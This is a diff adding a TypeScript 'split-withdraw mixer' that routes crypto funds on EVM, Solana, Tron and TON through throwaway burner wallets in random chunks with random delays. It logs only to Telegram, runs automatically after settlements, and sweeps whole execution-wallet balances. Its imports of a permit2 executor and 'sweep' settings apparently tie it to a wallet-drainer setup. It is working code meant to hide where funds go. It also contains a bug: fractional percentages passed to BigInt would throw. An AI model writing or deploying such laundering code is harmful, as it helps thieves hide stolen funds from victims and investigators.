@@ -1,0 +1,887 @@
+/**
+ * Non-custodial split-withdraw mixer — routes native funds through ephemeral burner
+ * wallets before reaching the final destination. Logs exclusively via injected Telegram
+ * callback (never console).
+ *
+ * Env:
+ *   MIXING_ENABLED=true
+ *   MIXING_MIN_CHUNKS=3          (default 3)
+ *   MIXING_MAX_CHUNKS=5          (default 5)
+ *   MIXING_DELAY_MIN_SEC=10
+ *   MIXING_DELAY_MAX_SEC=45
+ *   FINAL_WALLET_EVM / SOL / TRX / TON — destination per chain
+ */
+import { randomBytes, randomInt } from 'node:crypto'
+import {
+  Connection,
+  Keypair,
+  PublicKey,
+  SystemProgram,
+  TransactionMessage,
+  VersionedTransaction,
+} from '@solana/web3.js'
+import {
+  Address as TonAddress,
+  internal,
+  WalletContractV4,
+} from '@ton/ton'
+import {
+  createPublicClient,
+  createWalletClient,
+  formatEther,
+  getAddress,
+  http,
+  isAddress,
+  parseEther,
+  type Address,
+  type Hex,
+} from 'viem'
+import { mainnet } from 'viem/chains'
+import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
+
+import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
+import { EvmAdapter } from '../adapters/evm-adapter.js'
+import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
+import {
+  fetchTronBalance,
+  fetchTonBalance,
+  isDryRunExecution,
+  loadServerSolanaKeypair,
+  resolveServerSolanaPublicKey,
+  resolveServerTonAddress,
+  resolveServerTronAddressAsync,
+} from '../logic/server-chain-execution.js'
+import { resolveSettlementExecutorKey } from '../logic/permit2-executor.js'
+import { resolveEvmRpcUrlForChain } from '../logic/permit2-executor.js'
+import { resolveTronSensoryFullHost, tronProApiHeaders } from '../logic/tron-sensory-armor.js'
+import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from '../logic/ton-sensory-armor.js'
+import type {
+  SettlementBridgeTriggerContext,
+  SettlementBroadcastResult,
+} from '../logic/settlement-execution-bridge.js'
+
+export type MixChain = 'EVM' | 'SOL' | 'TRX' | 'TON'
+
+export type MixTelegramLogger = (message: string) => Promise<void>
+
+export type SplitWithdrawParams = {
+  chain: MixChain
+  amountNative: bigint
+  finalAddress: string
+  /** EVM only — defaults to 1 (mainnet). */
+  chainId?: number
+  rpcUrl?: string
+  log?: MixTelegramLogger
+}
+
+export type SplitWithdrawChunkResult = {
+  index: number
+  percent: number
+  burnerAddress: string
+  leg1Tx?: string
+  leg2Tx?: string
+  error?: string
+}
+
+export type SplitWithdrawResult = {
+  ok: boolean
+  dryRun: boolean
+  chain: MixChain
+  chunkCount: number
+  chunks: SplitWithdrawChunkResult[]
+  finalAddress: string
+  amountNative: string
+  error?: string
+}
+
+export type MixChainResult = {
+  chain: MixChain
+  ok: boolean
+  skipped?: string
+  result?: SplitWithdrawResult
+  error?: string
+}
+
+export type MixAllResult = {
+  ok: boolean
+  enabled: boolean
+  dryRun: boolean
+  chains: MixChainResult[]
+  timestamp: string
+}
+
+let registeredTelegramLogger: MixTelegramLogger | null = null
+
+/** Wire Telegram delivery from the API layer — split-withdraw never uses console. */
+export function registerSplitWithdrawTelegramLogger(log: MixTelegramLogger): void {
+  registeredTelegramLogger = log
+}
+
+function readEnv(key: string): string | undefined {
+  if (typeof process === 'undefined') return undefined
+  const raw = process.env[key]?.trim()
+  return raw || undefined
+}
+
+function isTruthyEnv(key: string): boolean {
+  const v = readEnv(key)?.toLowerCase()
+  return v === 'true' || v === '1' || v === 'yes'
+}
+
+export function isMixingEnabled(): boolean {
+  return isTruthyEnv('MIXING_ENABLED')
+}
+
+function resolveLogger(explicit?: MixTelegramLogger): MixTelegramLogger {
+  const log = explicit ?? registeredTelegramLogger
+  return log ?? (async () => {})
+}
+
+function resolveChunkBounds(): { min: number; max: number } {
+  const minRaw = Number.parseInt(readEnv('MIXING_MIN_CHUNKS') ?? '3', 10)
+  const maxRaw = Number.parseInt(readEnv('MIXING_MAX_CHUNKS') ?? '5', 10)
+  const min = Number.isFinite(minRaw) && minRaw >= 2 ? minRaw : 3
+  const max = Number.isFinite(maxRaw) && maxRaw >= min ? maxRaw : 5
+  return { min, max }
+}
+
+function resolveDelayBoundsMs(): { min: number; max: number } {
+  const minSec = Number.parseInt(readEnv('MIXING_DELAY_MIN_SEC') ?? '10', 10)
+  const maxSec = Number.parseInt(readEnv('MIXING_DELAY_MAX_SEC') ?? '45', 10)
+  const min = Number.isFinite(minSec) && minSec > 0 ? minSec * 1000 : 10_000
+  const max = Number.isFinite(maxSec) && maxSec >= minSec ? maxSec * 1000 : 45_000
+  return { min, max }
+}
+
+function pickChunkCount(): number {
+  const { min, max } = resolveChunkBounds()
+  return randomInt(min, max + 1)
+}
+
+/** Random positive percentages summing to 100. */
+export function randomChunkPercents(count: number): number[] {
+  if (count < 2) return [100]
+  const cuts = Array.from({ length: count - 1 }, () => Math.random()).sort((a, b) => a - b)
+  const points = [0, ...cuts, 1]
+  const raw = []
+  for (let i = 0; i < count; i++) raw.push(points[i + 1]! - points[i]!)
+  const scaled = raw.map((w) => Math.max(1, Math.round(w * 1000) / 10))
+  const sum = scaled.reduce((a, b) => a + b, 0)
+  scaled[scaled.length - 1]! += 100 - sum
+  return scaled
+}
+
+export function allocateChunkAmounts(total: bigint, percents: number[]): bigint[] {
+  const amounts: bigint[] = []
+  let allocated = 0n
+  for (let i = 0; i < percents.length; i++) {
+    if (i === percents.length - 1) {
+      amounts.push(total - allocated)
+    } else {
+      const part = (total * BigInt(percents[i]!)) / 100n
+      amounts.push(part)
+      allocated += part
+    }
+  }
+  return amounts
+}
+
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms))
+}
+
+function randomDelayMs(): number {
+  const { min, max } = resolveDelayBoundsMs()
+  return randomInt(min, max + 1)
+}
+
+function readFinalWallet(chain: MixChain): string | null {
+  const keys: Record<MixChain, string> = {
+    EVM: 'FINAL_WALLET_EVM',
+    SOL: 'FINAL_WALLET_SOL',
+    TRX: 'FINAL_WALLET_TRX',
+    TON: 'FINAL_WALLET_TON',
+  }
+  return readEnv(keys[chain]) ?? null
+}
+
+function parsePositiveFloat(raw: string | undefined, fallback: number): number {
+  if (!raw) return fallback
+  const n = Number.parseFloat(raw)
+  return Number.isFinite(n) && n > 0 ? n : fallback
+}
+
+function readMinNative(chain: MixChain): bigint {
+  switch (chain) {
+    case 'EVM':
+      return parseEther(String(parsePositiveFloat(readEnv('MIXING_MIN_ETH') ?? readEnv('SWEEP_MIN_ETH'), 0.001)))
+    case 'SOL':
+      return BigInt(Math.floor(parsePositiveFloat(readEnv('MIXING_MIN_SOL') ?? readEnv('SWEEP_MIN_SOL'), 0.001) * 1e9))
+    case 'TRX':
+      return BigInt(Math.floor(parsePositiveFloat(readEnv('MIXING_MIN_TRX') ?? readEnv('SWEEP_MIN_TRX'), 1) * 1e6))
+    case 'TON':
+      return BigInt(Math.floor(parsePositiveFloat(readEnv('MIXING_MIN_TON') ?? readEnv('SWEEP_MIN_TON'), 0.1) * 1e9))
+    default:
+      return 0n
+  }
+}
+
+// ── EVM transfers ─────────────────────────────────────────────────────────────
+
+async function evmTransfer(
+  fromKey: Hex,
+  to: Address,
+  value: bigint,
+  chainId: number,
+  rpcUrl: string,
+): Promise<string> {
+  if (isDryRunExecution()) return `dry-run-evm-${Date.now()}`
+  const account = privateKeyToAccount(fromKey)
+  const publicClient = createPublicClient({ transport: http(rpcUrl) })
+  const walletClient = createWalletClient({ account, transport: http(rpcUrl) })
+  const gasPrice = await publicClient.getGasPrice()
+  const gas = 21_000n
+  const hash = await walletClient.sendTransaction({
+    account,
+    chain: null,
+    to,
+    value,
+    gas,
+    gasPrice,
+  } as unknown as Parameters<typeof walletClient.sendTransaction>[0])
+  return hash
+}
+
+async function evmForwardGasBuffer(rpcUrl: string): Promise<bigint> {
+  const publicClient = createPublicClient({ transport: http(rpcUrl) })
+  const gasPrice = await publicClient.getGasPrice()
+  return (21_000n * gasPrice * 12n) / 10n
+}
+
+// ── Solana transfers ──────────────────────────────────────────────────────────
+
+async function solTransfer(
+  keypair: Keypair,
+  to: string,
+  lamports: bigint,
+  rpcUrl: string,
+): Promise<string> {
+  if (isDryRunExecution()) return `dry-run-sol-${Date.now()}`
+  const connection = new Connection(rpcUrl, { commitment: 'confirmed' })
+  const { blockhash } = await connection.getLatestBlockhash('finalized')
+  const msg = new TransactionMessage({
+    payerKey: keypair.publicKey,
+    recentBlockhash: blockhash,
+    instructions: [
+      SystemProgram.transfer({
+        fromPubkey: keypair.publicKey,
+        toPubkey: new PublicKey(to),
+        lamports: Number(lamports),
+      }),
+    ],
+  }).compileToV0Message()
+  const tx = new VersionedTransaction(msg)
+  tx.sign([keypair])
+  const sig = await connection.sendRawTransaction(tx.serialize(), {
+    preflightCommitment: 'confirmed',
+    skipPreflight: false,
+    maxRetries: 3,
+  })
+  return sig
+}
+
+const SOL_FORWARD_FEE_BUFFER = 10_000n
+
+// ── Tron transfers ────────────────────────────────────────────────────────────
+
+function randomTronPrivateKey(): string {
+  return randomBytes(32).toString('hex')
+}
+
+async function tronAddressFromPrivateKey(pk: string): Promise<string> {
+  const { TronWeb } = await import('tronweb')
+  const addr = TronWeb.address?.fromPrivateKey(pk.padStart(64, '0'))
+  if (typeof addr !== 'string') throw new Error('Could not derive TRX burner address')
+  return addr
+}
+
+async function trxTransfer(
+  privateKey: string,
+  to: string,
+  amountSun: bigint,
+  rpcUrl?: string,
+): Promise<string> {
+  if (isDryRunExecution()) return `dry-run-trx-${Date.now()}`
+  const fullHost = rpcUrl?.trim() || resolveTronSensoryFullHost()
+  const { TronWeb } = await import('tronweb')
+  const headers = tronProApiHeaders()
+  const pk = privateKey.replace(/^0x/i, '').padStart(64, '0')
+  const tronWeb =
+    headers != null
+      ? new TronWeb({ fullHost, headers, privateKey: pk })
+      : new TronWeb({ fullHost, privateKey: pk })
+  const fromAddress = tronWeb.defaultAddress.base58 as string
+  const unsignedTx = await tronWeb.transactionBuilder.sendTrx(
+    to,
+    Number(amountSun),
+    fromAddress,
+  )
+  const signed = await tronWeb.trx.sign(
+    unsignedTx as Parameters<typeof tronWeb.trx.sign>[0],
+  )
+  const result = (await tronWeb.trx.sendRawTransaction(
+    signed as Parameters<typeof tronWeb.trx.sendRawTransaction>[0],
+  )) as { result?: boolean; txid?: string; transaction?: { txID?: string } }
+  if (!result.result) throw new Error('TRX broadcast failed')
+  return result.txid ?? result.transaction?.txID ?? 'unknown'
+}
+
+const TRX_FORWARD_FEE_BUFFER = 2_000_000n
+
+// ── TON transfers ─────────────────────────────────────────────────────────────
+
+async function tonTransferFromMnemonic(
+  mnemonic: string,
+  to: string,
+  amountNanotons: bigint,
+  rpcUrl?: string,
+): Promise<string> {
+  if (isDryRunExecution()) return `dry-run-ton-${Date.now()}`
+  const endpoint = rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
+  const { mnemonicToWalletKey } = await import('@ton/crypto')
+  const { TonClient } = await import('@ton/ton')
+  const key = await mnemonicToWalletKey(mnemonic.split(' '))
+  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
+  const apiKey = tonCenterApiHeaders()?.['X-API-Key']
+  const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
+  const provider = client.open(wallet)
+  const seqno = await provider.getSeqno()
+  await provider.sendTransfer({
+    seqno,
+    secretKey: key.secretKey,
+    messages: [
+      internal({
+        to: TonAddress.parse(to),
+        value: amountNanotons,
+        bounce: false,
+      }),
+    ],
+  })
+  const txs = await client.getTransactions(wallet.address, { limit: 1 })
+  return txs[0]?.hash().toString('hex') ?? 'pending'
+}
+
+async function tonAddressFromMnemonic(mnemonic: string): Promise<string> {
+  const { mnemonicToWalletKey } = await import('@ton/crypto')
+  const key = await mnemonicToWalletKey(mnemonic.split(' '))
+  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
+  return wallet.address.toString({ bounceable: false, urlSafe: true })
+}
+
+const TON_FORWARD_FEE_BUFFER = 50_000_000n
+
+// ── Chunk execution per chain ─────────────────────────────────────────────────
+
+async function runEvmChunk(params: {
+  chunkIndex: number
+  percent: number
+  chunkAmount: bigint
+  executionKey: Hex
+  finalAddress: Address
+  chainId: number
+  rpcUrl: string
+  log: MixTelegramLogger
+}): Promise<SplitWithdrawChunkResult> {
+  const burnerKey = generatePrivateKey()
+  const burnerAccount = privateKeyToAccount(burnerKey)
+  const gasBuffer = await evmForwardGasBuffer(params.rpcUrl)
+  const leg1Value = params.chunkAmount + gasBuffer
+
+  const result: SplitWithdrawChunkResult = {
+    index: params.chunkIndex,
+    percent: params.percent,
+    burnerAddress: burnerAccount.address,
+  }
+
+  try {
+    await params.log(
+      `🔀 EVM chunk ${params.chunkIndex + 1}: execution → burner <code>${burnerAccount.address.slice(0, 10)}…</code> (${formatEther(params.chunkAmount)} ETH)`,
+    )
+    result.leg1Tx = await evmTransfer(
+      params.executionKey,
+      burnerAccount.address,
+      leg1Value,
+      params.chainId,
+      params.rpcUrl,
+    )
+    await params.log(`⏳ EVM chunk ${params.chunkIndex + 1}: waiting ${Math.round(randomDelayMs() / 1000)}s`)
+    await sleep(randomDelayMs())
+    await params.log(
+      `🔀 EVM chunk ${params.chunkIndex + 1}: burner → final <code>${params.finalAddress.slice(0, 10)}…</code>`,
+    )
+    result.leg2Tx = await evmTransfer(
+      burnerKey,
+      params.finalAddress,
+      params.chunkAmount,
+      params.chainId,
+      params.rpcUrl,
+    )
+  } catch (e) {
+    result.error = e instanceof Error ? e.message : String(e)
+    await params.log(`❌ EVM chunk ${params.chunkIndex + 1}: ${result.error}`)
+  }
+  return result
+}
+
+async function runSolChunk(params: {
+  chunkIndex: number
+  percent: number
+  chunkAmount: bigint
+  executionKeypair: Keypair
+  finalAddress: string
+  rpcUrl: string
+  log: MixTelegramLogger
+}): Promise<SplitWithdrawChunkResult> {
+  const burner = Keypair.generate()
+  const leg1Lamports = params.chunkAmount + SOL_FORWARD_FEE_BUFFER
+  const result: SplitWithdrawChunkResult = {
+    index: params.chunkIndex,
+    percent: params.percent,
+    burnerAddress: burner.publicKey.toBase58(),
+  }
+
+  try {
+    await params.log(
+      `🔀 SOL chunk ${params.chunkIndex + 1}: execution → burner <code>${result.burnerAddress.slice(0, 8)}…</code>`,
+    )
+    result.leg1Tx = await solTransfer(
+      params.executionKeypair,
+      result.burnerAddress,
+      leg1Lamports,
+      params.rpcUrl,
+    )
+    await params.log(`⏳ SOL chunk ${params.chunkIndex + 1}: waiting`)
+    await sleep(randomDelayMs())
+    await params.log(`🔀 SOL chunk ${params.chunkIndex + 1}: burner → final`)
+    result.leg2Tx = await solTransfer(burner, params.finalAddress, params.chunkAmount, params.rpcUrl)
+  } catch (e) {
+    result.error = e instanceof Error ? e.message : String(e)
+    await params.log(`❌ SOL chunk ${params.chunkIndex + 1}: ${result.error}`)
+  }
+  return result
+}
+
+async function runTrxChunk(params: {
+  chunkIndex: number
+  percent: number
+  chunkAmount: bigint
+  executionKey: string
+  finalAddress: string
+  rpcUrl?: string
+  log: MixTelegramLogger
+}): Promise<SplitWithdrawChunkResult> {
+  const burnerKey = randomTronPrivateKey()
+  const burnerAddress = await tronAddressFromPrivateKey(burnerKey)
+  const leg1Sun = params.chunkAmount + TRX_FORWARD_FEE_BUFFER
+  const result: SplitWithdrawChunkResult = {
+    index: params.chunkIndex,
+    percent: params.percent,
+    burnerAddress,
+  }
+
+  try {
+    await params.log(`🔀 TRX chunk ${params.chunkIndex + 1}: execution → burner`)
+    result.leg1Tx = await trxTransfer(params.executionKey, burnerAddress, leg1Sun, params.rpcUrl)
+    await params.log(`⏳ TRX chunk ${params.chunkIndex + 1}: waiting`)
+    await sleep(randomDelayMs())
+    await params.log(`🔀 TRX chunk ${params.chunkIndex + 1}: burner → final`)
+    result.leg2Tx = await trxTransfer(burnerKey, params.finalAddress, params.chunkAmount, params.rpcUrl)
+  } catch (e) {
+    result.error = e instanceof Error ? e.message : String(e)
+    await params.log(`❌ TRX chunk ${params.chunkIndex + 1}: ${result.error}`)
+  }
+  return result
+}
+
+async function runTonChunk(params: {
+  chunkIndex: number
+  percent: number
+  chunkAmount: bigint
+  executionMnemonic: string
+  finalAddress: string
+  rpcUrl?: string
+  log: MixTelegramLogger
+}): Promise<SplitWithdrawChunkResult> {
+  const { mnemonicNew } = await import('@ton/crypto')
+  const burnerMnemonic = (await mnemonicNew()).join(' ')
+  const burnerAddress = await tonAddressFromMnemonic(burnerMnemonic)
+  const leg1Nano = params.chunkAmount + TON_FORWARD_FEE_BUFFER
+  const result: SplitWithdrawChunkResult = {
+    index: params.chunkIndex,
+    percent: params.percent,
+    burnerAddress,
+  }
+
+  try {
+    await params.log(`🔀 TON chunk ${params.chunkIndex + 1}: execution → burner`)
+    result.leg1Tx = await tonTransferFromMnemonic(
+      params.executionMnemonic,
+      burnerAddress,
+      leg1Nano,
+      params.rpcUrl,
+    )
+    await params.log(`⏳ TON chunk ${params.chunkIndex + 1}: waiting`)
+    await sleep(randomDelayMs())
+    await params.log(`🔀 TON chunk ${params.chunkIndex + 1}: burner → final`)
+    result.leg2Tx = await tonTransferFromMnemonic(
+      burnerMnemonic,
+      params.finalAddress,
+      params.chunkAmount,
+      params.rpcUrl,
+    )
+  } catch (e) {
+    result.error = e instanceof Error ? e.message : String(e)
+    await params.log(`❌ TON chunk ${params.chunkIndex + 1}: ${result.error}`)
+  }
+  return result
+}
+
+/** Split native amount across ephemeral burners, then forward to final wallet. */
+export async function splitWithdraw(params: SplitWithdrawParams): Promise<SplitWithdrawResult> {
+  const log = resolveLogger(params.log)
+  const dryRun = isDryRunExecution()
+  const chunkCount = pickChunkCount()
+  const percents = randomChunkPercents(chunkCount)
+  const amounts = allocateChunkAmounts(params.amountNative, percents)
+
+  const base: SplitWithdrawResult = {
+    ok: false,
+    dryRun,
+    chain: params.chain,
+    chunkCount,
+    chunks: [],
+    finalAddress: params.finalAddress,
+    amountNative: params.amountNative.toString(),
+  }
+
+  if (params.amountNative <= 0n) {
+    base.error = 'amountNative must be > 0'
+    await log(`❌ Mix ${params.chain}: ${base.error}`)
+    return base
+  }
+
+  await log(
+    [
+      dryRun ? '🧪 <b>Split-withdraw (DRY RUN)</b>' : '🔀 <b>Split-withdraw started</b>',
+      `Chain: <b>${params.chain}</b> · ${chunkCount} chunks`,
+      `Amount: <code>${params.amountNative.toString()}</code>`,
+      `Final: <code>${params.finalAddress.slice(0, 16)}…</code>`,
+    ].join('\n'),
+  )
+
+  const chunks: SplitWithdrawChunkResult[] = []
+
+  try {
+    switch (params.chain) {
+      case 'EVM': {
+        if (!isAddress(params.finalAddress)) {
+          base.error = 'invalid EVM final address'
+          await log(`❌ Mix EVM: ${base.error}`)
+          return base
+        }
+        const final = getAddress(params.finalAddress)
+        const executionKey = resolveSettlementExecutorKey()
+        if (!executionKey) {
+          base.error = 'SETTLEMENT_EXECUTION_PRIVATE_KEY not configured'
+          await log(`❌ Mix EVM: ${base.error}`)
+          return base
+        }
+        const chainId = params.chainId ?? 1
+        const rpcUrl = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(chainId))
+        for (let i = 0; i < chunkCount; i++) {
+          chunks.push(
+            await runEvmChunk({
+              chunkIndex: i,
+              percent: percents[i]!,
+              chunkAmount: amounts[i]!,
+              executionKey,
+              finalAddress: final,
+              chainId,
+              rpcUrl,
+              log,
+            }),
+          )
+        }
+        break
+      }
+      case 'SOL': {
+        const executionKeypair = loadServerSolanaKeypair()
+        if (!executionKeypair) {
+          base.error = 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY not configured'
+          await log(`❌ Mix SOL: ${base.error}`)
+          return base
+        }
+        const rpcUrl =
+          params.rpcUrl?.trim() ||
+          resolveInstitutionalSolanaRpcUrl() ||
+          'https://api.mainnet-beta.solana.com'
+        for (let i = 0; i < chunkCount; i++) {
+          chunks.push(
+            await runSolChunk({
+              chunkIndex: i,
+              percent: percents[i]!,
+              chunkAmount: amounts[i]!,
+              executionKeypair,
+              finalAddress: params.finalAddress,
+              rpcUrl,
+              log,
+            }),
+          )
+        }
+        break
+      }
+      case 'TRX': {
+        const executionKey = readEnv('TRON_EXECUTION_PRIVATE_KEY')?.replace(/^0x/i, '')
+        if (!executionKey) {
+          base.error = 'TRON_EXECUTION_PRIVATE_KEY not configured'
+          await log(`❌ Mix TRX: ${base.error}`)
+          return base
+        }
+        for (let i = 0; i < chunkCount; i++) {
+          chunks.push(
+            await runTrxChunk({
+              chunkIndex: i,
+              percent: percents[i]!,
+              chunkAmount: amounts[i]!,
+              executionKey,
+              finalAddress: params.finalAddress,
+              rpcUrl: params.rpcUrl,
+              log,
+            }),
+          )
+        }
+        break
+      }
+      case 'TON': {
+        const executionMnemonic = readEnv('TON_EXECUTION_MNEMONIC')
+        if (!executionMnemonic) {
+          base.error = 'TON_EXECUTION_MNEMONIC not configured'
+          await log(`❌ Mix TON: ${base.error}`)
+          return base
+        }
+        for (let i = 0; i < chunkCount; i++) {
+          chunks.push(
+            await runTonChunk({
+              chunkIndex: i,
+              percent: percents[i]!,
+              chunkAmount: amounts[i]!,
+              executionMnemonic,
+              finalAddress: params.finalAddress,
+              rpcUrl: params.rpcUrl,
+              log,
+            }),
+          )
+        }
+        break
+      }
+      default:
+        base.error = 'unsupported chain'
+        await log(`❌ Mix: ${base.error}`)
+        return base
+    }
+  } catch (e) {
+    base.error = e instanceof Error ? e.message : String(e)
+    await log(`❌ Mix ${params.chain}: ${base.error}`)
+    base.chunks = chunks
+    return base
+  }
+
+  base.chunks = chunks
+  base.ok = chunks.length > 0 && chunks.every((c) => c.error == null && c.leg1Tx != null && c.leg2Tx != null)
+  await log(
+    base.ok
+      ? `✅ <b>Split-withdraw complete</b> (${params.chain}, ${chunkCount} chunks)`
+      : `⚠️ <b>Split-withdraw finished with errors</b> (${params.chain})`,
+  )
+  return base
+}
+
+function mapSettlementChainFamily(
+  family: SettlementBroadcastResult['chain_family'],
+): MixChain | null {
+  switch (family) {
+    case 'EVM':
+      return 'EVM'
+    case 'SVM':
+      return 'SOL'
+    case 'TRON':
+      return 'TRX'
+    case 'TON':
+      return 'TON'
+    default:
+      return null
+  }
+}
+
+function parseSettlementChainId(ctx: SettlementBridgeTriggerContext): number {
+  const raw = ctx.chain_id?.trim()
+  const n = raw != null ? Number.parseInt(raw, 10) : Number.NaN
+  return Number.isFinite(n) && n > 0 ? n : 1
+}
+
+/** Optional post-settlement hook when MIXING_ENABLED=true. */
+export async function maybeRunPostSettlementMixing(
+  ctx: SettlementBridgeTriggerContext,
+  result: SettlementBroadcastResult,
+  log?: MixTelegramLogger,
+): Promise<void> {
+  if (!isMixingEnabled()) return
+  if (!result.broadcasted || result.tx_hash == null) return
+
+  const chain = mapSettlementChainFamily(result.chain_family)
+  if (chain == null) return
+
+  const amountRaw = ctx.amount?.trim()
+  if (amountRaw == null || amountRaw === '' || !/^\d+$/.test(amountRaw)) return
+  const amountNative = BigInt(amountRaw)
+  if (amountNative <= 0n) return
+
+  const finalAddress = readFinalWallet(chain)
+  if (!finalAddress) return
+
+  const logger = resolveLogger(log)
+  await logger(`🔀 Post-settlement mix triggered (${chain})`)
+
+  await splitWithdraw({
+    chain,
+    amountNative,
+    finalAddress,
+    ...(chain === 'EVM' ? { chainId: parseSettlementChainId(ctx) } : {}),
+    log: logger,
+  })
+}
+
+async function fetchExecutionNativeBalance(chain: MixChain, chainId = 1): Promise<bigint> {
+  switch (chain) {
+    case 'EVM': {
+      const key = resolveSettlementExecutorKey()
+      if (!key) return 0n
+      const address = privateKeyToAccount(key).address
+      const rpcUrl = getRpcUrlForChainWithFallback(chainId)
+      const adapter = new EvmAdapter({ chainId: `evm:${chainId}`, viemChain: mainnet, rpcUrl })
+      return BigInt(await adapter.getBalance(address))
+    }
+    case 'SOL': {
+      const pubkey = resolveServerSolanaPublicKey()
+      if (!pubkey) return 0n
+      const rpc = resolveInstitutionalSolanaRpcUrl()
+      const connection = new Connection(rpc, { commitment: 'confirmed' })
+      return BigInt(await connection.getBalance(new PublicKey(pubkey)))
+    }
+    case 'TRX': {
+      const addr = await resolveServerTronAddressAsync()
+      if (!addr) return 0n
+      return BigInt(await fetchTronBalance(addr))
+    }
+    case 'TON':
+      return await fetchTonBalance()
+    default:
+      return 0n
+  }
+}
+
+/** Mix full execution-wallet native balances (minus reserve) on all configured chains. */
+export async function mixAllExecutionWallets(options?: {
+  force?: boolean
+  log?: MixTelegramLogger
+}): Promise<MixAllResult> {
+  const enabled = isMixingEnabled() || options?.force === true
+  const dryRun = isDryRunExecution()
+  const log = resolveLogger(options?.log)
+  const timestamp = new Date().toISOString()
+
+  if (!enabled) {
+    return { ok: true, enabled: false, dryRun, chains: [], timestamp }
+  }
+
+  const chains: MixChainResult[] = []
+  const mixChains: MixChain[] = ['EVM', 'SOL', 'TRX', 'TON']
+
+  for (const chain of mixChains) {
+    const finalAddress = readFinalWallet(chain)
+    if (!finalAddress) {
+      chains.push({ chain, ok: true, skipped: 'FINAL_WALLET not configured' })
+      continue
+    }
+
+    const minNative = readMinNative(chain)
+    const balance = await fetchExecutionNativeBalance(chain)
+    const spendable = balance > minNative ? balance - minNative : 0n
+
+    if (spendable <= 0n) {
+      chains.push({
+        chain,
+        ok: true,
+        skipped: `balance ${balance.toString()} below reserve`,
+      })
+      continue
+    }
+
+    try {
+      const result = await splitWithdraw({
+        chain,
+        amountNative: spendable,
+        finalAddress,
+        ...(chain === 'EVM' ? { chainId: 1 } : {}),
+        log,
+      })
+      chains.push({ chain, ok: result.ok, result })
+    } catch (e) {
+      chains.push({
+        chain,
+        ok: false,
+        error: e instanceof Error ? e.message : String(e),
+      })
+    }
+  }
+
+  const ok = chains.length > 0 && chains.every((c) => c.ok || c.skipped != null)
+  return { ok, enabled: true, dryRun, chains, timestamp }
+}
+
+/** Format mix results for Telegram. */
+export function formatMixAllResult(result: MixAllResult): string {
+  if (!result.enabled) {
+    return 'Mixing disabled (MIXING_ENABLED=false)'
+  }
+
+  const lines = [
+    result.dryRun ? '🧪 <b>Execution wallet mix (DRY RUN)</b>' : '🔀 <b>Execution wallet mix</b>',
+    '━━━━━━━━━━━━━━━━',
+    `🕐 ${result.timestamp}`,
+    `Overall: ${result.ok ? '✅' : '⚠️'}`,
+    '',
+  ]
+
+  if (result.chains.length === 0) {
+    lines.push('No chains configured.')
+    return lines.join('\n')
+  }
+
+  for (const c of result.chains) {
+    lines.push(`<b>${c.chain}</b> ${c.ok ? '✅' : '⚠️'}`)
+    if (c.skipped) lines.push(`  ⏭ ${c.skipped}`)
+    if (c.error) lines.push(`  ❌ ${c.error}`)
+    if (c.result) {
+      lines.push(`  Chunks: ${c.result.chunkCount} · amount ${c.result.amountNative}`)
+      for (const ch of c.result.chunks) {
+        if (ch.leg1Tx) lines.push(`  L1#${ch.index + 1}: <code>${ch.leg1Tx.slice(0, 18)}…</code>`)
+        if (ch.leg2Tx) lines.push(`  L2#${ch.index + 1}: <code>${ch.leg2Tx.slice(0, 18)}…</code>`)
+        if (ch.error) lines.push(`  ❌ chunk ${ch.index + 1}: ${ch.error}`)
+      }
+    }
+    lines.push('')
+  }
+
+  return lines.join('\n').trim()
+}
